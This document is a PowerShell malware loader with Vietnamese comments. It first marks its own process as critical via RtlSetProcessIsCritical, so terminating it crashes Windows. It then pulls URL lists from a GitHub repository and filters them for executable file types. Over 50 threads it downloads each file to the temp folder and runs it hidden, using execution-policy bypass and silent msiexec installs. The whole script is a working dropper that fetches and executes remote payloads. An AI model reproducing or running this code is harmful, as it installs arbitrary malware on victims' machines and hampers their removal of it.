function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# 1. Nguồn URL (List đã check của bạn)
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

# Các định dạng hỗ trợ (Mở rộng tối đa cho Windows)
$extensions = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"

Write-Host "[*] Đang đọc danh sách đã check..." -ForegroundColor Cyan

# Tải và gộp list, loại bỏ trùng lặp tuyệt đối
$allUrls = foreach ($s in $sources) {
    try {
        (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content -split "`n" | 
        ForEach-Object { $_.Trim() } | 
        Where-Object { $_ -ne "" -and ($extensions | Where-Object { $url = $_; $url.ToLower().EndsWith($_) }) }
    } catch { }
} | Select-Object -Unique

Write-Host "[*] Tổng cộng $($allUrls.Count) link sẵn sàng. Đang chạy 50 luồng..." -ForegroundColor Green

# 2. Cấu hình Runspace Pool (50 luồng)
$sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
$pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
$pool.Open()

$threads = New-Object System.Collections.Generic.List[PSObject]

# 3. Logic xử lý từng loại Extension
foreach ($u in $allUrls) {
    $powershell = [powershell]::Create().AddScript({
        param($url)
        try {
            # Lấy tên file sạch (bỏ tham số sau dấu ?)
            $cleanUrl = $url.Split('?')[0]
            $fileName = [System.IO.Path]::GetFileName($cleanUrl)
            $path = Join-Path $env:TEMP $fileName
            $ext = [System.IO.Path]::GetExtension($path).ToLower()
            
            # Tải xuống cực nhanh
            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
            
            # --- KIỂM TRA LOẠI FILE ĐỂ CHẠY CHO ĐÚNG ---
            switch ($ext) {
                ".ps1" { 
                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden 
                }
                { ".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $_ } { 
                    Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden 
                }
                { ".msi", ".msp" -contains $_ } { 
                    Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden 
                }
                default { 
                    # Chạy trực tiếp cho .exe, .bat, .cmd, .com, .scr...
                    Start-Process -FilePath $path -WindowStyle Hidden 
                }
            }
        } catch { }
    }).AddArgument($u)

    $powershell.RunspacePool = $pool
    $threads.Add((New-Object PSObject -Property @{
        Instance = $powershell
        Handle   = $powershell.BeginInvoke()
    }))
}

# 4. Đợi hoàn tất
while ($threads.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }

# 5. Dọn dẹp bộ nhớ
foreach ($t in $threads) {
    $t.Instance.EndInvoke($t.Handle)
    $t.Instance.Dispose()
}
$pool.Close()
Write-Host "[+] Xong! Đã xử lý tất cả link từ list của bạn." -ForegroundColor White
